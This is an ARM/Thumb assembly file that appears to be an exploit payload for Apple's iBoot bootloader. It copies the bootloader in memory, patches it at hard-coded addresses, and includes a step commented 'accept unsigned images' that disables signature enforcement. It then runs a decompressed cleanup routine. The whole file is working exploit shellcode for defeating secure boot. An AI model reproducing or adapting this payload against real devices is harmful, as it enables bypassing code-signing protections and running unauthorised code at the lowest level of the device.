    .text
    .syntax    unified


    .arm
_entry:
    b    _entry


    .org    0x20bd4
    .thumb
    .thumb_func
_get_current_task:
    bx    lr


    .org    0x21c9c
    .thumb_func
_arch_cpu_quiesce:
    bx    lr


    .org    0x24c70
    .thumb
    .thumb_func
_decompress_lzss:
    bx    lr


    .org    0x338d0
    .arm
_bcopy:
    bx    lr


    .org    0x34320
    .thumb
    .thumb_func
_disable_interrupts:
    bx    lr


    .org    0x478c0
    .thumb
    .thumb_func
_iboot_patch:
    ldr    r0, =0x9ff478d2          @ end point of _iboot_patch()
    ldr    r1, =0x84042800          @ payload
    movs   r2, #0x44                @ payload_sz
    blx    _bcopy

    ldr    r0, =0xc04               @ main_task() ptr
    ldr    r1, =(0x9ff42800 + 1)    @ payload_base
    str    r1, [r4, r0]

    b.n     _payload2


    .org    0x47bc8
    .global _payload
    .thumb
    .thumb_func
_payload:
    ldr    sp, =0x9FFF8000
    bl     _disable_interrupts
    ldr    r4, =0x84000000

    ldr    r0, =0x9ff00000          @ could be 0, but we use explicit offset for iloader
    mov    r1, r4
    ldr    r2, =0x44800
    blx    _bcopy

    b.n    _iboot_patch

_payload2:
    @ accept unsigned images
    ldr    r0, =0x1a574
    ldr    r1, =0x60182000
    str    r1, [r4, r0]

    bl     _get_current_task
    movs   r1, #0
    b.n    _next

.align    2


    .org    0x47bec
    .long   0xe7ffdef0
    .short  0xdef0
_next:
    str    r1, [r0, #0x44]

    ldr    r0, =0x9ff48000          @ dst
    movs   r1, #0xe8                @ dst_sz
    ldr    r2, =0x9ff47a9c          @ nettoyeur
    movs   r3, #0xd5                @ nettoyeur_sz

    mov    r5, r0
    bl     _decompress_lzss
    ldr    r0, =(0x9FF01748 + 1)

    blx    r0
    bl     _arch_cpu_quiesce
    blx    r5                       @ nettoyeur()
    bx     r4

.align    2
